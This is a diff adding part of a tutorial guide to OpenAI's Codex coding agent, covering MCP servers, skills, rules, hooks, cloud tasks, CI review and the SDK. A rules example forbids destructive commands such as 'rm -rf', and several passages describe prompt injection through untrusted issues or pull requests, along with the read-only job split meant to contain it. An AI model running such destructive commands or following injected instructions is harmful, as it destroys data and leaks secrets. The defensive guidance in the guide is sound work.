+[mcp_servers.experimental]
+command = "node"
+args = ["./tools/experimental-mcp.js"]
+enabled = false</code></pre>
+<p>Key options: <code>command</code>/<code>args</code>/<code>env</code>/<code>cwd</code> for stdio servers; <code>url</code>, <code>bearer_token_env_var</code>, <code>http_headers</code> or <code>auth = "oauth"</code> for HTTP servers; <code>enabled_tools</code>/<code>disabled_tools</code> to scope; <code>required = true</code> to fail fast if a server you depend on doesn't start. The <code>codex mcp</code> command manages the same entries from the shell (run <code>codex mcp --help</code> for your version's subcommands). In a session, <code>/mcp</code> lists what is connected.</p>
+<blockquote class="callout"><p><strong>Why <code>bearer_token_env_var</code>:</strong> a token pasted into <code>config.toml</code> ends up in dotfile backups and screenshots. If you reference an env var instead, the file is safe to share.</p></blockquote>
+<p><strong>Exercise 3.1 — Docs and Issues</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Add the <code>context7</code> server and ask Codex to upgrade DevToolkit's Express error handler to the current Express major's recommended pattern, citing the docs it pulled.</li>
+<li>Create a fine-grained GitHub token with read-only issues and PR access, export it as <code>GITHUB_PAT</code>, and add the <code>github</code> server with the allow-list above.</li>
+<li>Open a DevToolkit issue "GET /users should paginate", then ask Codex to implement it from the issue text alone.</li>
+<li>Confirm in <code>/mcp</code> that only the allowed GitHub tools are exposed.</li>
+<li>Set <code>required = true</code> on context7, break its command, and observe the startup failure.</li>
+</ol>
+<hr />
+
+<h3 id="module-32-skills">Module 3.2 — Skills</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Intermediate · <strong>Prereqs:</strong> 2.3 · <strong>Time:</strong> ~3h<br>
+<strong>Skip-check (test-out):</strong> A repo skill generates a complete new DevToolkit resource (route, schema, tests) from one short prompt.<br>
+<strong>Skip if:</strong> You've written skills that Codex picks up both implicitly and by name.<br>
+<strong>Unlocks:</strong> Phase 3 Capstone, 4.3</p>
+</blockquote>
+<h4>Skills versus AGENTS.md</h4>
+<p>AGENTS.md is always loaded. A skill is loaded only when relevant. Codex sees each skill's name and description up front and reads the full <code>SKILL.md</code> only when a task matches. Put always-true rules in AGENTS.md and multi-step procedures in skills. If you push procedures into AGENTS.md instead, they eat the byte cap and dilute the rules that matter on every task.</p>
+<p>Repo skills live in <code>.agents/skills/&lt;name&gt;/SKILL.md</code>; personal skills live in <code>~/.agents/skills/</code>. Invoke one explicitly by mentioning it with <code>$</code> (for example <code>$api-endpoint</code>), or let Codex choose it from the description. A bundled <code>$skill-creator</code> skill can draft new skills for you.</p>
+<pre><code class="language-markdown">---
+name: api-endpoint
+description: Create a new DevToolkit REST resource (Express router, Zod schemas, Prisma access, Vitest + Supertest tests). Use when asked to add an endpoint or resource.
+---
+
+# Add a DevToolkit resource
+
+1. Read `AGENTS.md` and `src/routes/users.ts` as the reference pattern.
+2. Create `src/schemas/&lt;resource&gt;.ts` with Zod schemas for create, update, params and list query (limit 1-100, default 20; cursor optional).
+3. Create `src/routes/&lt;resource&gt;.ts`:
+   - parse every input with the schemas; on failure respond 400 `{ error, code: "VALIDATION" }`
+   - reads filter `deletedAt: null`; DELETE sets `deletedAt`
+   - protected by `requireAuth`
+4. Mount the router in `src/app.ts` in alphabetical order.
+5. Add the Prisma model if missing, then run `npx prisma migrate dev --name add_&lt;resource&gt;`.
+6. Create `tests/routes/&lt;resource&gt;.test.ts` covering 201, 400, 401, 404 and soft-delete.
+7. Run `npx tsc --noEmit` and `npm test`. Fix failures before reporting.
+8. Final message: files changed, migration name, test count.</code></pre>
+<p><strong>Exercise 3.2 — Resource Generator</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Save the skill above at <code>.agents/skills/api-endpoint/SKILL.md</code>.</li>
+<li>Prompt "Add a projects resource (name, ownerId)". Did Codex pick the skill implicitly?</li>
+<li>Reset, and prompt "<code>$api-endpoint</code> tags (label, color hex)" to invoke it explicitly.</li>
+<li>Find one step Codex skipped and make that step more specific in the skill.</li>
+<li>Use <code>$skill-creator</code> to draft a second skill, <code>db-migration-review</code>, then edit it by hand.</li>
+<li>Commit <code>.agents/skills/</code>.</li>
+</ol>
+<hr />
+
+<h3 id="module-33-hooks-and-rules">Module 3.3 — Hooks and Rules</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Intermediate · <strong>Prereqs:</strong> 2.1, 2.2 · <strong>Time:</strong> ~3h<br>
+<strong>Skip-check (test-out):</strong> A rule makes <code>git push</code> require approval, and a hook writes an audit line for every tool call.<br>
+<strong>Skip if:</strong> You already enforce command policy with <code>.rules</code> files and run hooks.<br>
+<strong>Unlocks:</strong> 4.2</p>
+</blockquote>
+<h4>Rules: command policy</h4>
+<p>Rules (<code>.rules</code> files, the "execpolicy") decide, by command prefix, whether a shell command runs freely, needs your approval, or is forbidden. The sandbox limits <em>where</em> a command can act. Rules limit <em>which</em> commands run at all. You need both, because <code>git push --force</code> is fully inside the workspace and still destructive.</p>
+<pre><code class="language-python"># ~/.codex/rules/default.rules  (Starlark syntax; see the Rules docs page for file locations in your version)
+prefix_rule(pattern = ["git", "push"], decision = "prompt")
+prefix_rule(pattern = ["git", "reset", "--hard"], decision = "prompt")
+prefix_rule(pattern = ["npx", "prisma", "migrate", "reset"], decision = "forbidden")
+prefix_rule(pattern = ["rm", "-rf"], decision = "forbidden")
+prefix_rule(pattern = ["npm", "test"], decision = "allow")</code></pre>
+<p><code>codex exec --ignore-rules</code> skips rules for one run. Never put that flag in CI, because it turns your policy off exactly where nobody is watching.</p>
+<h4>Hooks: run your code at lifecycle events</h4>
+<p>Hooks run a command (or MCP tool) when an event fires: <code>SessionStart</code>, <code>UserPromptSubmit</code>, <code>PreToolUse</code>, <code>PermissionRequest</code>, <code>PostToolUse</code>, <code>PreCompact</code>, <code>Stop</code>, <code>SessionEnd</code>, subagent start/stop and more. Enable them with <code>features.hooks</code>, then define them in <code>hooks.json</code> or a <code>[hooks]</code> table in <code>config.toml</code>. The hooks reference documents the registration schema and what each event receives on stdin.</p>
+<p>A good first hook is an audit log. It only observes and never blocks, so a bug in it can't stall your session:</p>
+<pre><code class="language-bash">#!/usr/bin/env bash
+# ~/.codex/hooks/audit-log.sh — register for PostToolUse
+set -euo pipefail
+log_dir="${HOME}/.codex/audit"
+mkdir -p "$log_dir"
+payload="$(cat)"
+ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+repo="$(basename "$(git rev-parse --show-toplevel 2&gt;/dev/null || pwd)")"
+printf '%s\t%s\t%s\n' "$ts" "$repo" "$(printf '%s' "$payload" | tr '\n' ' ' | cut -c1-2000)" \
+  &gt;&gt; "${log_dir}/$(date -u +%Y-%m-%d).tsv"
+exit 0</code></pre>
+<pre><code class="language-toml"># ~/.codex/config.toml
+[features]
+hooks = true</code></pre>
+<blockquote class="callout"><p><strong>Hooks vs. rules:</strong> if what you want is "never run X", write a rule. It is declarative and enforced before execution. Use a hook when you need logic: formatting after edits, posting a notification at <code>Stop</code>, or loading context at <code>SessionStart</code>.</p></blockquote>
+<p><strong>Exercise 3.3 — Guardrails</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Create the rules file above and confirm Codex asks before <code>git push</code> and refuses <code>prisma migrate reset</code>.</li>
+<li>Install the audit hook, register it for <code>PostToolUse</code> per the hooks reference, and run a short task.</li>
+<li>Inspect the day's <code>.tsv</code> and identify each tool call.</li>
+<li>Add a second hook on <code>Stop</code> that runs <code>npx tsc --noEmit</code> in DevToolkit and prints the result.</li>
+<li>Write one paragraph in <code>docs/codex-setup.md</code> on which guardrail is a rule and which is a hook, and why.</li>
+</ol>
+<hr />
+
+<h3 id="module-34-ide-extension-and-codex-cloud">Module 3.4 — IDE Extension and Codex Cloud</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Intermediate · <strong>Prereqs:</strong> 2.3 · <strong>Time:</strong> ~3h<br>
+<strong>Skip-check (test-out):</strong> Delegate a DevToolkit task to a cloud environment that installs deps and runs tests, then apply the result locally.<br>
+<strong>Skip if:</strong> You have a working cloud environment for a repo and use it routinely.<br>
+<strong>Unlocks:</strong> 4.2, Final Capstone</p>
+</blockquote>
+<h4>IDE extension</h4>
+<p>The Codex extension runs in VS Code and its forks (Cursor, Windsurf) and in JetBrains IDEs (IntelliJ, PyCharm, WebStorm, Rider). It's the same agent with the same <code>~/.codex</code> config, AGENTS.md and skills, plus your open files and selection as context. Use it when the change is anchored to code you're looking at. Use the CLI when it's anchored to a command or a script.</p>
+<h4>Cloud environments</h4>
+<p>A cloud task runs in an isolated container with a copy of your GitHub repo. You create the environment once in the ChatGPT app (Work in › Cloud › Select environment › Create environment) and publish it. Its main settings:</p>
+<ul>
+<li><strong>Install script</strong> — runs on setup (dependencies, codegen).</li>
+<li><strong>Environment variables</strong> vs. <strong>secrets</strong> — secrets are scoped to allowed domains so they can't be exfiltrated to arbitrary hosts.</li>
+<li><strong>Internet access</strong> — off, an allow-list ("Additional allowed domains", "Package managers" preset), or all public internet. Prefer the allow-list. A task that reads an untrusted issue with full internet access is a prompt-injection exfiltration path.</li>
+</ul>
+<pre><code class="language-bash">#!/usr/bin/env bash
+# DevToolkit cloud environment — install script
+set -euo pipefail
+npm ci
+npx prisma generate
+npx tsc --noEmit</code></pre>
+<p>Integration tests that need PostgreSQL must reach a database. Point <code>DATABASE_URL</code> at a disposable hosted test database: store it as a secret and allow-list only that host. Never point it at production. A cloud task does whatever its prompt and any text it reads tell it to, inside whatever the environment can reach.</p>
+<p>From the terminal, <code>codex cloud</code> lets you browse active and finished cloud chats, submit work to an environment, and apply the result to your local checkout.</p>
+<blockquote class="callout"><p><strong>Plan note:</strong> cloud tasks need a ChatGPT sign-in; API-key-only setups don't get them. Machine size also depends on the plan (smaller on Plus, larger on Pro/Business/Enterprise).</p></blockquote>
+<p><strong>Exercise 3.4 — Delegate and Apply</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Install the extension in your editor and confirm it picks up DevToolkit's AGENTS.md (ask it for the test command).</li>
+<li>Push DevToolkit to GitHub and create a cloud environment with the install script above and the "Package managers" internet preset.</li>
+<li>Delegate: "Add rate limiting (100 req / 15 min per IP) to /auth/login with tests."</li>
+<li>While it runs, do something else locally. That parallelism is the reason to use cloud tasks.</li>
+<li>Review the cloud diff, apply it locally with <code>codex cloud</code> or the app, and run tests yourself.</li>
+<li>Note any step where the cloud container lacked something your laptop had.</li>
+</ol>
+<hr />
+
+<h3 id="phase-3-capstone-devtoolkit-toolchain">Phase 3 Capstone: DevToolkit Toolchain</h3>
+<p><strong>Project: A self-extending DevToolkit workspace</strong></p>
+<p><strong>Dataset:</strong> DevToolkit</p>
+<p><strong>Deliverables:</strong></p>
+<ol>
+<li>Two MCP servers (one stdio, one HTTP) configured with tool allow-lists and tokens via env vars.</li>
+<li><code>api-endpoint</code> skill plus one more repo skill, both committed.</li>
+<li>Rules file with at least five prefix rules, each with a written justification.</li>
+<li>Audit hook and <code>Stop</code> type-check hook running.</li>
+<li>Published cloud environment with an allow-listed internet policy.</li>
+<li>Two new DevToolkit resources (<code>projects</code>, <code>tags</code>) built through the skill. One was built locally and one in the cloud.</li>
+<li><code>docs/codex-setup.md</code> updated to cover all of the above.</li>
+</ol>
+<hr />
+
+<h2 id="phase-4-automation">Phase 4: Automation</h2>
+<h3 id="weeks-7-8">Weeks 7–8 | Goal: run Codex unattended — in scripts, in CI, and inside your own code — with typed, checkable output</h3>
+<hr />
+
+<h3 id="module-41-codex-exec-and-structured-output">Module 4.1 — codex exec and Structured Output</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Intermediate · <strong>Prereqs:</strong> 2.1 · <strong>Time:</strong> ~3h<br>
+<strong>Skip-check (test-out):</strong> A shell script runs <code>codex exec</code> with an output schema and fails the script when the JSON says tests are failing.<br>
+<strong>Skip if:</strong> You already script <code>codex exec</code> with <code>--output-schema</code> and <code>--json</code>.<br>
+<strong>Unlocks:</strong> 4.2, 4.3</p>
+</blockquote>
+<h4>The non-interactive mode</h4>
+<p><code>codex exec "&lt;prompt&gt;"</code> runs one task to completion and exits. It defaults to a <strong>read-only</strong> sandbox, so a script can't modify your repo unless you say so. That's the right default for automation, where nobody reviews intermediate steps.</p>
+<table>
+<tr><th>Flag</th><th>Effect</th></tr>
+<tr><td><code>--sandbox workspace-write</code></td><td>Allow edits in the workspace (replaces the removed <code>--full-auto</code>)</td></tr>
+<tr><td><code>--json</code></td><td>Stream events to stdout as JSON Lines instead of human text</td></tr>
+<tr><td><code>--output-schema ./schema.json</code></td><td>Final message must be JSON matching this schema</td></tr>
+<tr><td><code>-o</code>, <code>--output-last-message &lt;path&gt;</code></td><td>Write the final message to a file</td></tr>
+<tr><td><code>--profile &lt;name&gt;</code></td><td>Use a profile (e.g. <code>ci</code> from Module 2.2)</td></tr>
+<tr><td><code>--ephemeral</code></td><td>Don't persist the session</td></tr>
+<tr><td><code>--skip-git-repo-check</code></td><td>Allow running outside a git repo</td></tr>
+<tr><td><code>--ignore-user-config</code></td><td>Ignore <code>~/.codex/config.toml</code> for reproducible runs</td></tr>
+<tr><td><code>codex exec resume --last "&lt;prompt&gt;"</code></td><td>Continue the most recent exec session</td></tr>
+</table>
+<h4>A health-report schema</h4>
+<pre><code class="language-json">{
+  "type": "object",
+  "additionalProperties": false,
+  "required": ["tests_passed", "failing_tests", "typecheck_ok", "risks"],
+  "properties": {
+    "tests_passed": { "type": "boolean" },
+    "failing_tests": { "type": "array", "items": { "type": "string" } },
+    "typecheck_ok": { "type": "boolean" },
+    "risks": {
+      "type": "array",
+      "items": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": ["file", "issue", "severity"],
+        "properties": {
+          "file": { "type": "string" },
+          "issue": { "type": "string" },
+          "severity": { "type": "string", "enum": ["low", "medium", "high"] }
+        }
+      }
+    }
+  }
+}</code></pre>
+<pre><code class="language-bash">#!/usr/bin/env bash
+# scripts/codex-health.sh — DevToolkit nightly health check
+set -euo pipefail
+cd "$(git rev-parse --show-toplevel)"
+out="$(mktemp)"
+codex exec \
+  --profile ci \
+  --sandbox workspace-write \
+  --ephemeral \
+  --output-schema scripts/health.schema.json \
+  -o "$out" \
+  "Run npm test and npx tsc --noEmit. Then scan src/routes for missing Zod validation or missing deletedAt filters. Report using the schema. Do not modify files."
+
+cat "$out"
+if [ "$(jq -r '.tests_passed and .typecheck_ok' "$out")" != "true" ]; then
+  echo "DevToolkit health check failed" &gt;&amp;2
+  exit 1
+fi
+high="$(jq '[.risks[] | select(.severity == "high")] | length' "$out")"
+if [ "$high" -gt 0 ]; then
+  echo "$high high-severity risk(s) found" &gt;&amp;2
+  exit 2
+fi</code></pre>
+<blockquote class="callout"><p><strong>Common mistake:</strong> parsing Codex's prose with <code>grep</code>. Its wording changes between runs and models, so the script breaks silently. Use a schema, and your script reads a contract instead of a paragraph.</p></blockquote>
+<p><strong>Exercise 4.1 — Nightly Health Check</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Save the schema and script, then <code>chmod +x</code> the script.</li>
+<li>Run it on a green DevToolkit and confirm exit code 0.</li>
+<li>Break a test on purpose and confirm exit code 1.</li>
+<li>Run once with <code>--json</code> instead of <code>-o</code>, pipe it to <code>jq -c 'select(.type)' | head</code>, and list the event types you see.</li>
+<li>Use <code>codex exec resume --last "Now fix the failing test"</code> to continue the same session, and write down what context carried over.</li>
+<li>Commit <code>scripts/</code>.</li>
+</ol>
+<hr />
+
+<h3 id="module-42-github-review-and-ci">Module 4.2 — GitHub Review and CI</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Intermediate · <strong>Prereqs:</strong> 4.1 · <strong>Time:</strong> ~4h<br>
+<strong>Skip-check (test-out):</strong> Every DevToolkit PR gets an automated Codex review comment from a workflow you wrote, with the API key exposed to one step only.<br>
+<strong>Skip if:</strong> You run <code>openai/codex-action</code> in CI with a safety strategy you can justify.<br>
+<strong>Unlocks:</strong> 4.3, Final Capstone</p>
+</blockquote>
+<h4>Two ways Codex reviews PRs</h4>
+<ul>
+<li><strong>Codex GitHub integration</strong> — connect the repo in Codex settings, enable code review, then comment <code>@codex review</code> on a PR (or turn on automatic reviews). It runs in Codex cloud under your ChatGPT plan. Add a <code>## Review guidelines</code> section to AGENTS.md to steer what it flags.</li>
+<li><strong><code>openai/codex-action@v1</code></strong> — runs Codex inside your own GitHub Actions job with an API key. You control the prompt, the sandbox, the output, and when it runs.</li>
+</ul>
+<pre><code class="language-markdown">## Review guidelines
+- Flag any route that reads users without `deletedAt: null`.
+- Flag request input used before Zod parsing.
+- Flag logging of `passwordHash`, tokens, or `req.body` on auth routes.
+- Ignore formatting; Prettier handles it.</code></pre>
+<h4>A workflow with least privilege</h4>
+<pre><code class="language-yaml"># .github/workflows/codex-review.yml
+name: Codex PR review
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+permissions:
+  contents: read
+
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    outputs:
+      review: ${{ steps.codex.outputs.final-message }}
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          fetch-depth: 0
+      - name: Run Codex review
+        id: codex
+        uses: openai/codex-action@v1
+        with:
+          openai-api-key: ${{ secrets.OPENAI_API_KEY }}
+          prompt-file: .github/codex/review.md
+          sandbox: read-only
+          safety-strategy: drop-sudo
+          effort: high
+
+  comment:
+    needs: review
+    runs-on: ubuntu-latest
+    permissions:
+      pull-requests: write
+    steps:
+      - uses: actions/github-script@v7
+        env:
+          REVIEW: ${{ needs.review.outputs.review }}
+        with:
+          script: |
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.payload.pull_request.number,
+              body: process.env.REVIEW || "Codex returned no review.",
+            });</code></pre>
+<pre><code class="language-markdown">&lt;!-- .github/codex/review.md --&gt;
+You are reviewing a pull request to DevToolkit.
+Get the change set with: git diff origin/main...HEAD
+
+Apply the "Review guidelines" section of AGENTS.md.
+Report at most 8 findings, most severe first, each as:
+- **file:line** — problem — concrete fix
+If there are no real problems, say "No blocking issues." Do not modify files.</code></pre>
+<h4>Why it is split into two jobs</h4>
+<p>The PR's code and text are untrusted input; a malicious PR can contain instructions aimed at the agent. Here the job that runs Codex can only <em>read</em> (<code>contents: read</code>, <code>sandbox: read-only</code>, <code>drop-sudo</code>). The job that can write to the PR never runs Codex. An injected instruction therefore has nothing dangerous to reach. Pass the API key only on the step that needs it, never as a job-wide <code>env</code>. GitHub also withholds secrets from fork PRs, so plan how forks are handled.</p>
+<p><strong>Exercise 4.2 — Automated Review</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Add the Review guidelines section to DevToolkit's AGENTS.md.</li>
+<li>Add <code>OPENAI_API_KEY</code> as a repo secret, then commit the workflow and prompt file.</li>
+<li>Open a PR that deliberately drops a <code>deletedAt</code> filter and confirm the review comment flags it.</li>
+<li>Connect the Codex GitHub integration and comment <code>@codex review</code> on the same PR. Compare the two reviews.</li>
+<li>Add a second workflow that runs <code>scripts/codex-health.sh</code> on a nightly <code>schedule</code>.</li>
+<li>Write down your fork-PR policy in <code>docs/codex-setup.md</code>.</li>
+</ol>
+<hr />
+
+<h3 id="module-43-the-codex-sdk">Module 4.3 — The Codex SDK</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Advanced · <strong>Prereqs:</strong> 4.1 · <strong>Time:</strong> ~4h<br>
+<strong>Skip-check (test-out):</strong> A TypeScript script starts a Codex thread on DevToolkit, gets schema-validated JSON back, and resumes the same thread for a follow-up.<br>
+<strong>Skip if:</strong> You've embedded Codex in a Node service with streaming and resumable threads.<br>
+<strong>Unlocks:</strong> Final Capstone</p>
+</blockquote>
+<h4>When to use the SDK</h4>
+<p><code>codex exec</code> is enough for scripts. Use the SDK (<code>@openai/codex-sdk</code>, Node 18+, server-side only) when Codex is one step in a larger program. Typical cases are a bot that triages issues, an internal tool, or a pipeline that needs to stream progress and keep threads alive across requests. It drives the same agent and honors the same config, AGENTS.md and sandbox.</p>
+<pre><code class="language-bash">npm install @openai/codex-sdk zod
+npm install -D tsx</code></pre>
+<pre><code class="language-ts">// scripts/triage.ts — run with: npx tsx scripts/triage.ts "GET /users returns deleted users"
+import { Codex } from "@openai/codex-sdk";
+import { z } from "zod";
+
+const Triage = z.object({
+  area: z.enum(["routes", "middleware", "db", "tests", "config"]),
+  files: z.array(z.string()),
+  root_cause: z.string(),
+  fix_plan: z.array(z.string()),
+});
+type Triage = z.infer&lt;typeof Triage&gt;;
+
+const triageSchema = {
+  type: "object",
+  additionalProperties: false,
+  required: ["area", "files", "root_cause", "fix_plan"],
+  properties: {
+    area: { type: "string", enum: ["routes", "middleware", "db", "tests", "config"] },
+    files: { type: "array", items: { type: "string" } },
+    root_cause: { type: "string" },
+    fix_plan: { type: "array", items: { type: "string" } },
+  },
+} as const;
+
+async function main(): Promise&lt;void&gt; {
+  const report = process.argv[2];
+  if (!report) {
+    console.error("usage: triage.ts \"&lt;bug report&gt;\"");
+    process.exit(1);
+  }
+
+  const codex = new Codex();
+  const thread = codex.startThread({ workingDirectory: process.cwd() });
+
+  const turn = await thread.run(
+    `Triage this DevToolkit bug report without editing files: ${report}`,
+    { outputSchema: triageSchema },
+  );
+  const triage: Triage = Triage.parse(JSON.parse(turn.finalResponse));
+  console.log(JSON.stringify(triage, null, 2));
+  console.log(`thread: ${thread.id}`);
+
+  const { events } = await thread.runStreamed(
+    "Now write a failing Vitest test that reproduces it. Do not fix the bug yet.",
+  );
+  for await (const event of events) {
+    if (event.type === "item.completed") {
+      console.log(`[${event.item.type}] done`);
+    } else if (event.type === "turn.completed") {
+      console.log("turn usage:", event.usage);
+    }
+  }
+}
+
+main().catch((err: unknown) =&gt; {
+  console.error(err instanceof Error ? err.message : err);
+  process.exit(1);
+});</code></pre>
+<p>Key points: <code>run()</code> on the same thread continues the conversation; <code>thread.id</code> lets you <code>codex.resumeThread(id)</code> later, even from another process; <code>runStreamed()</code> yields structured events so you can report progress; and validating with Zod after the schema catches drift instead of trusting it. The SDK authenticates via your Codex sign-in or <code>CODEX_API_KEY</code>.</p>
+<p><strong>Exercise 4.3 — Triage Bot</strong></p>
+<p>Dataset: DevToolkit</p>
+<p><em>Retrieval practice: before running the script, predict which event types the streamed turn will emit. Check your prediction against the output.</em></p>
+<ol>
+<li>Introduce a real bug (remove a <code>deletedAt</code> filter) and run the triage script with a matching report.</li>
+<li>Confirm the Zod parse succeeds and the identified files are correct.</li>
+<li>Save <code>thread.id</code>, exit, and write a second script that calls <code>codex.resumeThread(id)</code> and asks for the fix.</li>
+<li>Run the fix with a thread whose <code>sandboxMode</code> option is <code>workspace-write</code> (check the SDK's thread options for the exact name in your version).</li>
+<li>Make the script exit non-zero when Zod parsing fails, and test that path with a deliberately wrong schema.</li>
+<li>Commit <code>scripts/triage.ts</code>.</li>
+</ol>
+<hr />
+
+<h3 id="phase-4-capstone-automated-pr-pipeline">Phase 4 Capstone: Automated PR Pipeline</h3>
+<p><strong>Project: Issue → triage → fix → reviewed PR for DevToolkit</strong></p>
+<p><strong>Dataset:</strong> DevToolkit</p>
+<p><strong>Deliverables:</strong></p>
+<ol>
+<li><code>scripts/codex-health.sh</code> with schema, running nightly in Actions.</li>
+<li>Codex review workflow split into a read-only Codex job and a separate comment job.</li>
+<li>SDK triage script with schema plus Zod validation and a resumable thread.</li>
+<li>A second SDK script that applies the fix in <code>workspace-write</code> and runs tests.</li>
+<li>One real bug taken from issue to merged PR using only these tools plus your review.</li>
+<li>A threat-model note: what untrusted input each step reads and what it can write.</li>
+</ol>
+<hr />
+
+<h2 id="final-capstone-devtoolkit-ships-with-codex">Final Capstone: DevToolkit Ships with Codex</h2>
+<p><strong>Project: DevToolkit v1.0 — built, guarded, and maintained with Codex</strong></p>
+<p>Integrates all phases. Uses the DevToolkit project throughout.</p>
+<p><strong>Deliverables:</strong></p>
+<ol>
+<li>DevToolkit v1.0 with users, auth, projects and tags resources, plus pagination and rate limiting. All of it is tested and type-safe.</li>
+<li>Root and nested AGENTS.md (with Review guidelines), checked-in <code>.codex/config.toml</code>, and <code>.agents/skills/</code>.</li>
+<li>User config with <code>safe</code>, <code>ci</code> and <code>deep</code> profiles. Document them, but don't commit them.</li>
+<li>Rules and hooks enforcing the guardrails from Module 3.3.</li>
+<li>Two MCP servers with tool allow-lists.</li>
+<li>Cloud environment used for at least two delegated tasks.</li>
+<li>CI: nightly health check plus PR review, with least-privilege job split.</li>
+<li>SDK triage bot used on at least one real bug.</li>
+<li><code>docs/codex-setup.md</code> that lets a new teammate reproduce your setup in under an hour.</li>
+<li>Retrospective: three tasks Codex did best, three it did worst, and the config or prompt change that fixed each of the worst.</li>
+</ol>
+<hr />
+
+<h2 id="quick-reference">Quick Reference: Codex Tool-Task Matrix</h2>
+<table>
+<tr><th>Task</th><th>Tool / Command</th><th>Notes</th></tr>
+<tr><td>Install / update</td><td><code>npm install -g @openai/codex</code> · <code>brew install --cask codex</code></td><td>Update with the same installer you used</td></tr>
+<tr><td>Start interactive session</td><td><code>codex</code> / <code>codex "prompt"</code></td><td>Launch from the repo root</td></tr>
+<tr><td>Plan before editing</td><td><code>/plan</code> or Shift+Tab</td><td>Approve part of a plan, not just all-or-nothing</td></tr>
+<tr><td>Change model / effort</td><td><code>/model</code> · <code>model</code>, <code>model_reasoning_effort</code></td><td>Default GPT-6.2 Sol as of CLI 0.171.0</td></tr>
+<tr><td>Change permissions</td><td><code>/permissions</code> · <code>sandbox_mode</code>, <code>approval_policy</code></td><td><code>read-only | workspace-write | danger-full-access</code>; <code>on-request | never | granular</code></td></tr>
+<tr><td>See effective settings</td><td><code>/status</code></td><td>First stop when behavior surprises you</td></tr>
+<tr><td>Project instructions</td><td><code>AGENTS.md</code> · <code>/init</code></td><td>Closest file wins; capped by <code>project_doc_max_bytes</code></td></tr>
+<tr><td>Review changes</td><td><code>/diff</code> · <code>/review</code></td><td>Review in a fresh conversation with <code>review_model</code></td></tr>
+<tr><td>Manage context</td><td><code>/compact</code> · <code>/new</code> · <code>/fork</code></td><td>Fork to explore alternatives safely</td></tr>
+<tr><td>Resume work</td><td><code>codex resume</code> · <code>/resume</code> · <code>codex exec resume --last</code></td><td>Sessions persist unless <code>--ephemeral</code></td></tr>
+<tr><td>Revert agent changes</td><td><code>/undo</code> · git</td><td>Commit before each task; git is the real safety net</td></tr>
+<tr><td>Add tools</td><td><code>[mcp_servers.&lt;id&gt;]</code> · <code>codex mcp</code> · <code>/mcp</code></td><td>Scope with <code>enabled_tools</code>; tokens via env vars</td></tr>
+<tr><td>Reusable procedures</td><td><code>.agents/skills/&lt;name&gt;/SKILL.md</code> · <code>$name</code></td><td>Loaded only when relevant</td></tr>
+<tr><td>Command policy</td><td><code>.rules</code> files (<code>prefix_rule</code>)</td><td><code>allow</code> / <code>prompt</code> / <code>forbidden</code></td></tr>
+<tr><td>Lifecycle automation</td><td>Hooks (<code>features.hooks</code>)</td><td>Observe first; block only with rules</td></tr>
+<tr><td>Delegate to cloud</td><td>ChatGPT app · IDE · <code>codex cloud</code></td><td>Needs ChatGPT sign-in; allow-list internet</td></tr>
+<tr><td>Script a run</td><td><code>codex exec --output-schema s.json -o out.json</code></td><td>Read-only sandbox by default</td></tr>
+<tr><td>CI review</td><td><code>openai/codex-action@v1</code> · <code>@codex review</code></td><td>Split read-only Codex job from write job</td></tr>
+<tr><td>Embed in code</td><td><code>@openai/codex-sdk</code></td><td><code>startThread</code>, <code>run</code>, <code>runStreamed</code>, <code>resumeThread</code></td></tr>
+</table>
+
+<h2 id="glossary">Glossary</h2>
+<p>Canonical terms for this guide. Definitions state what a term <em>is</em>, not how to use it. Each <strong style="color:var(--coral)">Avoid</strong> line lists synonyms that cause confusion.</p>
+<h3 id="glossary-core">Core Concepts</h3>
+<dl class="glossary">
+<dt>Codex</dt>
+<dd>OpenAI's coding agent, reachable through the CLI, IDE extension, ChatGPT apps, cloud tasks, GitHub, the GitHub Action and the SDK.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "Codex model", "Codex API" — those refer to the retired 2021 language model.</dd>
+<dt>Surface</dt>
+<dd>A front end through which you drive the same Codex agent (CLI, IDE, app, cloud, GitHub).</dd>
+<dd class="avoid"><strong>Avoid:</strong> "product", "version" — they imply different agents with different behavior.</dd>
+<dt>Session</dt>
+<dd>One persisted conversation with Codex, resumable with <code>codex resume</code>.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "chat" when you mean a resumable unit; "thread" outside the SDK.</dd>
+<dt>Thread</dt>
+<dd>The SDK's handle on a session; it has an <code>id</code> and accepts repeated <code>run()</code> calls.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "conversation object", "context".</dd>
+<dt>Turn</dt>
+<dd>One prompt plus all the tool calls and output Codex produces until it hands control back.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "step" — a turn contains many steps.</dd>
+<dt>Workspace</dt>
+<dd>The directory Codex was launched in, and the default writable root under <code>workspace-write</code>.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "project" when you mean the writable boundary.</dd>
+<dt>Cloud task</dt>
+<dd>Work Codex performs in an isolated OpenAI-managed container against a GitHub repo.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "remote session" — that is a separate CLI feature for attaching to a running server.</dd>
+<dt>Environment</dt>
+<dd>The saved cloud configuration (repo, install script, variables, secrets, internet policy) a cloud task runs in.</dd>
+<dd class="avoid"><strong>Avoid:</strong> "container", "env vars" — the environment includes both and more.</dd>
+</dl>
+<h3 id="glossary-control">Control &amp; Configuration</h3>
+<dl class="glossary">
+<dt>Sandbox mode</dt>
+<dd>The OS-enforced limit on what Codex's commands can touch: <code>read-only</code>, <code>workspace-write</code> or <code>danger-full-access</code>.</dd>
